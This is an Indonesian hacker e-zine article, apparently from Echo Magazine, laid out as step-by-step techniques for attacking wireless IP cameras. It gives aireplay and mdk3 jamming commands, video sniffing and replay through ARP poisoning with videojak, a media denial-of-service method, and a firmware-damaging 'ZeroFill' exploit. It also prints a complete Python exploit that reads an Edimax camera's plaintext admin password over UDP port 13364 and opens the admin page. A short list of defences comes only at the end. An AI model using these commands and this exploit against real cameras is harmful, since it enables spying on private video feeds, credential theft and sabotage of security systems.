@@ -1,0 +1,358 @@
+           |             _)           
+  _ \  __| __ \   _ \_  / | __ \   _ \
+  __/ (    | | | (   | /  | |   |  __/
+\___|\___|_| |_|\___/___|_|_|  _|\___|
+ECHO MAGAZINE VOLUME XI, ISSUE XXVIII, PHILE 0x008.TXT
+
+
+Hacker Log Book: Tehnik Menyerang IP Camera - lirva32
+lirva32/at/yahoo/com
+
+-----| Pendahuluan
+
+Mungkin kita sering sekali menjumpai kamera-kamera pengintai dibeberapa tempat,
+misalkan saja di kantor, rumah, mall, hotel  bahkan dibeberapa tempat penting
+lainnya pun sudah banyak yang mempergunakan teknologi tersebut.  Sebenarnya apa
+sih IP Camera ? apakah aman IP Camera yang diimplementasikan ? ingat !!! tidak
+ada sistem yang 100% aman !!.
+
+Mari berkenalan dan bercanda ria dengan IP Camera...;) the next generation
+hacking katanya ;)
+  
+Internet Protocol Camera biasa disebut  dengan IP Camera adalah tipe kamera
+digital/analog yang biasa digunakan untuk melakukan pengawasan. 
+
+-----| Jenis-jenis IP Camera 
+ 
+[1] Centralized IP Camera 
+    Merupakan jenis IP Camera yang  membutuhkan Network Video Recorder (NVR)
+    atau Digital Video Recorder (DVR) untuk menangani beberapa IP Camera yang
+    terpasang dan dapat melakukan monitoring serta melakukan perekaman  video.
+
+[2] Decentralized IP Camera 
+    IP Camera jenis ini tidak membutuhkan NVR ataupun DVR, kamera ini mempunyai
+    fungsi recording didalamnya dan dapat disimpan secara langsung melalui
+    media simpan seperti flashdisk, harddisk dan NAS.
+
+Tak kenal maka  tak sayang, tak tau ciri maka tak mengenali..loh ;)
+Ciri-ciri IP Camera :
+  
+  [0x1]  Menggunakan firmware
+  [0x2]  Memiliki IP
+  [0x3]  Menjalankan services :
+           - Web server
+           - FTP Client
+           - Email
+           - Networking
+           - Security Protocol
+  [0x4]  Menggunakan koneksi wireless dan bisa juga tidak menggunakan wireless,
+         tapi kebanyakan diimplementasikan dengan menggunakan wireless karena
+         kemudahan dalam implementasi.
+
+wwwoowww, upppsss...sudah tau dong ciri2nya sehingga nantinya kita bisa
+melakukan penyerangan terhadap IP Camera dengan beberapa teknik penyerangan.
+  
+-----| Target Attacking 
+ 
+Pada ujicoba kali ini, saya melakukan penyerangan terhadap IP Camera yang
+terkoneksi wireless, dengan spesifikasi, sbb : 
+
+  [.] Access Point 		: Linksys WRT54G 
+  [.] IP Camera			: Edimax IC3030Iwn
+  [.] Firmware version  :  v1.5
+  [.] Type connection	:  by wireless
+
+  * target tidak hanya terbatas pada IP Camera tersebut karena kemungkinan
+    hampir semua IP Camera memiliki karakteristik yang sama.
+
+ -----| Persiapan Penyerangan 
+
+ . Notebook	: cukup notebook dengan wireless
+ . Wifi USB	: saya pake Airlive WL-1700usb
+ . OS		: saya mempergunakan BT R3     
+
+
+ -----| Skenario Penyerangan 
+
+
+                   (((  |     |  )))          ((       |                                          
+                        [-----]      )))             [ 0 ]                                         
+                        [-----]                      [ - ]                                         
+                           AP                     IP Camera                                        
+                                                                                              
+                                 ( (
+                                    ((
+                                      +-----+                                                    
+                                      |     |                                                  
+                                      |     |
+                                      +-----+
+                                         ||
+                                       -----
+                                  PC Monitoring 
+                                     IP Camera
+
+                   (((
+
+                    ((  
+                      (        o0o
+                               000
+                     :----:     |         
+                     : xx :     |
+                     :----:   / | \
+                    notebook    |
+                               / \
+                              /   \
+                              attacker
+
+
+         
+
+           keterangan :
+           - IP Camera terkoneksi pada Wireless Access Point (AP)
+           - PC terkoneksi ke AP yang digunakan untuk melakukan monitoring IP Camera
+           - Attacker melakukan penyerangan.
+
+
+-----| Tehnik Penyerangan 
+
+[1]  IP Camera Jamming
+
+Perhatikan gambar skenario dengan baik !! kegiatan apa yang bisa dilakukan
+untuk melakukan penyerangan terhadap IP Camera tersebut ? yup.. Wireless
+Jamming, yaitu : merusak dan membendung frekuensi, membanjiri channel dengan
+paket data ataupun membanjiri Radio AP dengan koneksi sebanyak-banyaknya
+sehingga menyebabkan wireless tidak lagi dapat bekerja.  Tentu saja IP Camera
+dan PC Monitoring akan terputus koneksinya dari Radio AP yang menyebabkan semua
+proses monitoring terhadap IP Camera terputus !!.
+
+Sebenarnya yang  di-jamming bukan IP Camera-nya melainkan Radio AP-nya yang
+menjadi pusat koneksi dari beberapa IP Camera.
+
+Tehnik Jamming yang bisa dipergunakan :
+
++------------------------------------
+| # aireplay -3 -x 1000 -b xx:xx:xx:xx:xx:xx -h xx:xx:xx:xx:xx:xx
++------------------------------------              
+           
+keterangan :
+* -b xx:xx:xx:xx:xx:xx merupakan mac address Access Point yang menjadi target
+* -h xx:xx:xx:xx:xx:xx merupakan mac address Station yang terkoneksi ke AP 
+(untuk mendapatkan station yang terkoneksi silahkan gunakan : airodump-ng)
+
+atau bisa juga melakukan, jamming dengan : mdk3, dengan perintah :
+
++------------------------------------
+| # ./mdk3 wlan0 d -c 11 -t xx:xx:xx:xx:xx:xx
++------------------------------------              
+           
+keterangan :
+* wlan0                 : merupakan interface wireless yang dipergunakan
+* d	                    : Disassociation Amok Mode
+* -c                    : channel yang dipergunakan oleh AP target
+* -t xx:xx:xx:xx:xx:xx	: merupakan mac address AP yang menjadi target
+
+* Untuk tehnik jamming, silahkan baca2 tulisan yang pernah saya buat :
+http://ezine.echo.or.id/issue25/010.txt, 
+
+tentu baca2 juga tentang penyerangan wireless AP dengan mdk3, yang tulisannya
+ada disini :
+http://bactracktutorial.blogspot.com/2011/12/mdk3-network-traffic-disruption.html
+
+[2]  IP Camera Video Replay Attack
+        
+Video Replay Attack merupakan kegiatan sniffing yang biasa dilakukan terhadap
+IP Camera.  Biasanya IP Camera diimplementasikan untuk bisa dimonitoring dan
+diakses melalui mobile devices sehingga harus menerapkan H.264 Codec, nah
+kelemahan dari H.264 codec inilah yang membuat IP Camera bisa menjadi target
+sniffing.
+        
+Bagaimana melakukan kegiatan Video Replay Attack, ikuti saja langkah2 berikut
+ini :
+
+ [00xa]  Download  Videojak 	: http://videojak.sourceforge.net/
+ [00xb]  Download  videosnarf	: http://videojak.sourceforge.net/videosnarf.html
+ [00xc]  Silahkan install kedua aplikasi tersebut
+ [00xd]  Kini saatnya menjalankan aplikasi tersebut :
+
+  +---------------------------
+  | # videojak -i wlan0 // // -w intip.pcap
+  +---------------------------
+
+  keterangan :
+  * -i wlan0      : mempergunakan interface wlan0
+  * -w intip.pcap : menangkap paket data dan menyimpannya kedalam file : intip.pcap
+
+  pada proses ini kita harus melakukan ARP Poisoning berulang-ulang terhadap target !!
+
+ [00xe] Menterjemahkan file *.pcap menjadi *.h264, dengan perintah :
+
+  +-------------------------
+  | # videosnarf -i intip.pcap
+  +-------------------------
+ 
+  keterangan :
+  * dari hasil konversi ini maka akan dihasilkan file-file *.h264
+
+ [00xf] Menjalankan file-file *.h264, dengan perintah :
+
+  +-------------------------
+  | # mplayer file.h264 -fps values
+  +-------------------------
+
+[3] Media Denial of Services
+         
+Merupakan tindakan penyerangan dengan membalikan paket data Audio dan Video
+yang dibroadcast oleh IP Camera.  Penyerangan dengan tehnik ini akan
+menyebabkan gerakan video yang dipantau lewat PC Monitoring menjadi lambat dan
+terputus-putus.
+
+Bagaimana melakukan kegiatan Media Denial of Services, ikuti saja langkah2
+berikut ini :
+
+  +--------------------------
+  | # videojak -i wlan0 // //
+  +--------------------------
+
+  keterangan :
+  - Pada saat videojak berjalan, silahkan serang dengan tombol : "d"  pada keyboard secara terus menerus.
+  - tombol "d"		:  attack an active video call by sending garbage video payload
+   
+[4] ZeroFill Attacking
+         
+Teknik penyerangan ini saya menyebutnya sebagai ZeroFill, ya swear itu hanya
+istilah saja yang saya berikan karena  saya bingung untuk memberi nama teknik
+penyerangan tersebut.  Teknik penyerangan ZeroFill merupakan teknik
+penyeranngan terhadap IP Camera dengan exploit tertentu yang bisa menyebabkan
+IP Camera lumpuh dan tidak bisa lagi dimonitoring oleh pemiliknya.
+
+Lumpuh??? Ya, IP Camera tidak bisa lagi berkomunikasi dengan host manapun
+!!! Kok bisa? bisa !!  exploit akan memanfaatkan celah kelemahan dari service 
+yang berjalan pada Port : 13364, dan akan melakukan proses pengrusakan (reset) 
+settingan IP.  Settingan IP akan berisi : 0.0.0.0 dengan subnet 0.0.0.0. Nah, t
+eknik inilah saya menyebutnya dengan ZeroFill karena akan merubah isi IP 
+menjadi 0.0.0.0 dan subnet pun 0.0.0.0 sehingga terjadi putus komunikasi.
+
+Untuk melakukan penyerangan ini, maka dibutuhkan exploit yang bisa kita dowload di :
+http://spareclockcycles.org/downloads/code/rxs-3211-changepw.py
+
+Sedangkan untuk daftar IP Camera yang bisa diserang dengan exploit ini, bisa
+dilihat pada url berikut ini : http://www.lirva32.org/images/daftar_camera.jpg
+
+Bagaimana melakukan kegiatan penyerangan ZeroFill terhadap IP Camera, yaitu :
+        
+ [001] Penyerang melakukan scaning untuk mendapatkan IP milik si IP Camera. 
+       Jika dalam proses scanning ditemukan "Port 554/tcp open RTSP" itu menunjukan 
+       IP Camera karena RTSP merupakan protokol VoIP ataupun IP Camera.
+
+ [002] Penyerang menjalankan exploit, dan memasukan IP milik si IP Camera.
+
+ [003] Ketika exploit dijalankan menyebabkan IP menjadi : 0.0.0.0 dan subnet
+       mask menjadi : 0.0.0.0.  Sebenarnya exploit tersebut bekerja untuk melakukan 
+       "pwned" pada IP Camera tapi exploit gagal bekerja pada area firmware.
+
+ [004] Karena ZeroFill (IP : 0.0.0.0 dan subnet mask : 0.0.0.0) akan menyebabkan 
+       kelumpuhan pada IP Camera
+
+ [005] Host yang bertugas melakukan monitoring IP Camera terhenti karena IP Camera 
+       tidak lagi memiliki IP.
+
+ [006] Kegiatan ini sangat berbahaya karena pada akhir penyerangan akan mengakibatkan 
+       kerusakan pada firmware dan butuh keahlian khusus untuk memperbaiki IP Camera 
+       yang terkena serangan ini.
+         
+[5] Pwned IP Camera
+
+Woowww... akhirnya IP Camera bisa di pwned juga !! Ya..tingkat administator
+pada IP Camera Edimax IC3030Iwn kena pwned so, ya tidak lagi aman !!  Gimana
+cara mem-pwned-nya ?, gini cerita analisisnya : 
+
+ [000] Penyerang melakukan koneksi ke AP dan mengaktifkan "Wireshark" *maaf, kondisi
+       AP open jadi kalo tidak open ya terpaksa kita harus membobolnya lebih dahulu !!
+
+ [001] Ada user yang melakukan login untuk melihat, memantau dan memonitoring IP Camera
+
+ [002] Ternyata UDP membroadcast paket data ke semua Host
+
+ [003] Password ikut juga dibroadcast melalui port : 13364
+
+ [004] Password bertipe Plaintext.
+
+ [005] User = "Admin", saya hanya menganalisa karena sebagian besar embeded devices 
+       selalu mempergunakan "Admin" sebagai default user.
+
+ [006] Dari ide dasar tersebutlah, maka "y3dips" membuatkan saya exploit untuk mem-pwned 
+       IP Camera Edimax  IC3030Iwn. (thx to : y3dips), exploitnya begini :
+
+  +-------------------------------- edimax_exp.py ------------------------
+  | #!/usr/bin/env python
+  |  """
+  | edimaxpwned.py- Edimax IC-3030iWn AuthByPass Exploit - y3dips(!c)2012
+  | Bug found by: Ben Schmidt for RXS-3211 IP camera http://www.securityfocus.com/archive/1/518123
+  | """
+  |
+  | import socket
+  | import webbrowser
+  | import sys
+  |
+  | if len(sys.argv) != 2:
+  |     print "Eg: ./edimaxpwned.py edimax-IP"
+  |     sys.exit(1)
+  | 
+  | port=13364
+  | target= sys.argv[1]
+  | 
+  | def read_pw(target, port): 
+  |     devmac = "\xff\xff\xff\xff\xff\xff"
+  |     #code="\x00\x02\xff\xfd" #broadcast reply
+  |     code="\x00\x06\xff\xf9"
+  |     data=devmac+code
+  |     sock =socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+  |     sock.connect((target,port))
+  |     try:
+  |         sock.send(data)
+  |         sock.settimeout(5)
+  |         tmp = sock.recv(4096)
+  |         return tmp
+  |     except socket.timeout:
+  |         return None
+  |
+  | def pwned_edi():
+  |     data=read_pw(target, port)
+  |     if data != None:
+  |         data=data[365:377]
+  |         pw=data.strip("\x00")
+  |         print pw
+  |         webbrowser.get("firefox" ).open('http://admin:'+pw+'@'+target+'/index.asp')
+  |     else:
+  |         print "Socket timeOut or not Vulnerable"
+  | 
+  | pwned_edi()
+  +----------------------------------------- EOF ------------------------------
+
+  [007]  Menjalakan exploit : python filename.py  ip_address_ip_camera
+  [008]  administrator pwned !!
+
+-----|  Melakukan Pengamanan 
+
+ [1]  Pisahkan jalur Network IP Camera dengan Public HotSpot
+ [2]  Matikan fungsi wireless, tetap gunakan kabel jaringan serta tidak menyatu
+      dengan jalur network produksi
+ [3]  Securing Your AP !!!
+ [4]  Upgrade the Firmware your IP Camera.
+
+-----|  Referensi 
+
+ [1] http://bactracktutorial.blogspot.com/2011/12/mdk3-network-traffic-disruption.html
+ [2] http://videojak.sourceforge.net/
+ [3] http://spareclockcycles.org/2012/01/23/exploiting-an-ip-camera-control-protocol-redux/
+
+
+-----|  Greetz
+
+ [1] Echo|Staff 
+ [2] MyDaughter : Faiza Debian dan Fivana Gutsy, semoga bisa memberikan yg terbaik utk ayah..;)
+ [3] Almarhum Arif Wicaksono, semoga tenang di alam sana...
+ [4] AllMyStudent@STMIK Bina Insani : kalian bisa menjadi apa yang kalian inginkan..belajarlah..!!!  
+ [5] RNDC, MyAlmamater : FTI_Univ_Budi_Luhur, OpenWRT Indonesia ;)
+ [6] Buat kamu yg cantik dan jutex ;) 
+
